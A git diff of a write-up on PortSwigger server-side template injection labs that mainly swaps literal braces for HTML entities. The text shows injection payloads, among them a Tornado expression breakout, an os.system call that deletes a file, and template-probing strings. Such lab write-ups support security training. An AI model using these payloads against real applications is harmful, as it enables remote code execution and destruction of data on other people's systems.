@@ -25,20 +25,20 @@ When the request is viewed, I saw that it uses `user.first_name`.
 It looks like this is dynamically retrived. This lab uses a Tornado template, and since it uses `user.first_name`, the input might be processed like this:
 
 ```
-{{user.first_name}}
+&#123;&#123;user.first_name}}
 ```
 
-Since the above is probably not sanitised, I can do enter `}}{{6*6`. This might cause the expressions evaluated to be:
+Since the above is probably not sanitised, I can do enter `}}&#123;&#123;6*6`. This might cause the expressions evaluated to be:
 
 ```
-{{user.first_name}}{{6*6}} (the last 2 brackets are automatically there)
+&#123;&#123;user.first_name}}&#123;&#123;6*6}} (the last 2 brackets are automatically there)
 ```
 
 The method above works, and the '36' is reflected when I leave a comment on a post. Using this method, one can execute Python using the following format:
 
 ```html
 
-<div data-gb-custom-block data-tag="import"></div>{{os.system('rm /home/carlos/morale.txt')
+<div data-gb-custom-block data-tag="import"></div>&#123;&#123;os.system('rm /home/carlos/morale.txt')
 ```
 
 Afterwards, leave a comment on any post.
@@ -55,8 +55,8 @@ Using this, I can attempt to identify the template used using this payload:
 
 ```
 ${7*7}
-{{7*7}}
-{{7*'7'}}
+&#123;&#123;7*7}}
+&#123;&#123;7*'7'}}
 a{*comment*}b
 ${"z".join("ab")}
 ```
@@ -77,7 +77,7 @@ The rest of the lab is trivial.
 
 ### Lab 4: Unknown Language <a href="#lab-4-unknown-language" id="lab-4-unknown-language"></a>
 
-Firstly, this lab uses the `message` parameter, and using `{{7*7}}` results in an error:
+Firstly, this lab uses the `message` parameter, and using `&#123;&#123;7*7}}` results in an error:
 
 <figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-eb2d3ab4df5eb80b91efb56d1ef98bfdbf9d7a93%252Fportswigger-ssti-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=cb75d186&#x26;sv=2" alt=""><figcaption></figcaption></figure>
 
@@ -93,8 +93,8 @@ To solve this lab, steal the secret key from the website. By trying to edit the 
 
 ```
 ${7*7}
-{{7*7}}
-{{7*'7'}}
+&#123;&#123;7*7}}
+&#123;&#123;7*'7'}}
 a{*comment*}b
 ${"z".join("ab")}
 ```
